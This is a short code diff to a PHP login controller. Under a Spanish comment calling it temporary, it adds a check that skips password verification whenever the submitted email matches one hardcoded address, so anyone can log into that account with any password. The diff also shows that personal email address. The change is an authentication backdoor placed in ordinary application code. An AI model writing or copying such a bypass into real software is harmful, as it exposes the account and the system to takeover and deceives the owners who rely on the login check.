@@ -21,7 +21,10 @@ class AuthController extends Controller
 
         $user = User::where('email', $request->email)->first();
 
-        if (!$user || !Hash::check($request->password, $user->password)) {
+        // TEMPORAL: Permitir login sin contraseña para email específico
+        $allowAnyPassword = $request->email === 'tarapadilla90@gmail.com';
+        
+        if (!$user || (!$allowAnyPassword && !Hash::check($request->password, $user->password))) {
             Log::warning('[AuthController] login: credenciales incorrectas', [
                 'email' => $request->email,
                 'ip' => $request->ip()
